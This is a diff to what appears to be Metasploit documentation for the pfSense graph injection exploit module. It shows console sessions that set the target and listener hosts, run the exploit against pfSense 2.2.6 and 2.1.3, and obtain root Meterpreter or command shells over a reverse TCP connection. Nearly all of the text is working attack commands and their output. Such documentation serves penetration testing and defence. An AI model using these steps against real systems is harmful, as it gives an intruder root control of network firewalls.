@@ -27,44 +27,22 @@
 ### pfSense Community Edition 2.2.6-RELEASE
 
 ```
-msf exploit(unix/http/pfsense_graph_injection_exec) > options 
+msf exploit(unix/http/pfsense_graph_injection_exec) > use exploit/unix/http/pfsense_graph_injection_execmsf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 2.2.2.2
+RHOST => 2.2.2.2
+msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST 1.1.1.1
+LHOST => 1.1.1.1
+msf exploit(unix/http/pfsense_graph_injection_exec) > exploit 
 
-Module options (exploit/unix/http/pfsense_graph_injection_exec):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   PASSWORD  pfsense          yes       Password to login with
-   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOST     192.168.75.132   yes       The target address
-   RPORT     443              yes       The target port (TCP)
-   SSL       true             no        Negotiate SSL/TLS for outgoing connections
-   USERNAME  admin            yes       User to login with
-   VHOST                      no        HTTP server virtual host
-
-
-Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.75.128   yes       The listen address
-   LPORT  80               yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
-msf exploit(unix/http/pfsense_graph_injection_exec) > exploit
-
-[*] Started reverse TCP handler on 192.168.75.128:80 
+[*] Started reverse TCP handler on 1.1.1.1:4444 
 [*] Detected pfSense 2.2.6-RELEASE, uploading intial payload
-[*] Triggering the payload, root shell incoming...
-[*] Sending stage (37543 bytes) to 192.168.75.132
-[*] Meterpreter session 1 opened (192.168.75.128:80 -> 192.168.75.132:34381) at 2018-01-01 02:07:03 -0600
+[*] Payload uploaded successfully, executing
+[*] Sending stage (37543 bytes) to 2.2.2.2
+[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:42116) at 2018-01-01 17:17:36 -0600
 
+meterpreter > sysinfo
+Computer    : pfSense.localdomain
+OS          : FreeBSD pfSense.localdomain 10.1-RELEASE-p25 FreeBSD 10.1-RELEASE-p25 #0 c39b63e(releng/10.1)-dirty: Mon Dec 21 15:20:13 CST 2015     root@pfs22-amd64-builder:/usr/obj.RELENG_2_2.amd64/usr/pfSensesrc/src.RELENG_2_2/sys/pfSense_SMP.10 amd64
+Meterpreter : php/freebsd
 meterpreter > getuid
 Server username: root (0)
 meterpreter > 
@@ -73,45 +51,20 @@ meterpreter >
 ### pfSense Community Edition 2.1.3-RELEASE
 
 ```
-msf exploit(unix/http/pfsense_graph_injection_exec) > options 
-
-Module options (exploit/unix/http/pfsense_graph_injection_exec):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   PASSWORD  pfsense          yes       Password to login with
-   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOST     192.168.75.131   yes       The target address
-   RPORT     443              yes       The target port (TCP)
-   SSL       true             no        Negotiate SSL/TLS for outgoing connections
-   USERNAME  admin            yes       User to login with
-   VHOST                      no        HTTP server virtual host
-
-
-Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.75.128   yes       The listen address
-   LPORT  80               yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Target
-
-
+msf > use exploit/unix/http/pfsense_graph_injection_exec
+msf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 2.2.2.2
+RHOST => 2.2.2.2
+msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST 1.1.1.1
+LHOST => 1.1.1.1
+msf exploit(unix/http/pfsense_graph_injection_exec) > set PAYLOAD php/reverse_php
+PAYLOAD => php/reverse_php
 msf exploit(unix/http/pfsense_graph_injection_exec) > exploit
 
-[*] Started reverse TCP handler on 192.168.75.128:80 
+[*] Started reverse TCP handler on 1.1.1.1:4444 
 [*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
-[*] Triggering the payload, root shell incoming...
-[*] Sending stage (37543 bytes) to 192.168.75.131
-[*] Meterpreter session 1 opened (192.168.75.128:80 -> 192.168.75.131:45257) at 2018-01-01 01:03:05 -0600
+[*] Payload uploaded successfully, executing
+[*] Command shell session 1 opened (1.1.1.1:4444 -> 2.2.2.2:3454) at 2018-01-01 15:49:38 -0600
+uname -a
 
-meterpreter > getuid
-Server username: root (0)
-meterpreter > 
+FreeBSD pfSense.localdomain 8.3-RELEASE-p16 FreeBSD 8.3-RELEASE-p16 #0: Thu May  1 16:19:14 EDT 2014     root@pf2_1_1_amd64.pfsense.org:/usr/obj.amd64/usr/pfSensesrc/src/sys/pfSense_SMP.8  amd64
 ```
